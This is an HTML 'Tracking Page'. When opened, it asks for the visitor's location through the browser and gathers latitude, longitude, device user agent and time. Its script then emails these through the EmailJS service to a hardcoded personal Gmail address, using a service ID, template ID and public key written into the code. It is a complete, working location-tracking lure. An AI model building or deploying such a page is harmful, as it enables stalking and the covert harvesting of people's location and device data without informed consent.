<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Tracking Page</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
</head>
<body>
  <h2>📡 Tracking in progress...</h2>
  <p id="status">Collecting location & device info...</p>

  <script>
    (function () {
      emailjs.init("SSC_AeZ77loUMTfLB"); // ✅ Your actual public key
    })();

    async function sendTrackingData() {
      const deviceInfo = navigator.userAgent;
      const time = new Date().toLocaleString();

      if (!navigator.geolocation) {
        document.getElementById("status").textContent = "Geolocation not supported.";
        return;
      }

      navigator.geolocation.getCurrentPosition(async (position) => {
        const lat = position.coords.latitude.toFixed(4);
        const lon = position.coords.longitude.toFixed(4);

        const templateParams = {
          location: `Latitude: ${lat}, Longitude: ${lon}`,
          time: time,
          device: deviceInfo,
          user_email: "ishanking58775@gmail.com"
        };

        try {
          await emailjs.send("service_2ncxavi", "template_pc1024b", templateParams);
          document.getElementById("status").textContent = "📬 Data sent to your email!";
        } catch (error) {
          console.error("Email send error:", error);
          document.getElementById("status").textContent = "❌ Failed to send email.";
        }
      }, (err) => {
        document.getElementById("status").textContent = "Location access denied or failed.";
        console.error(err);
      });
    }

    sendTrackingData();
  </script>
</body>
</html>
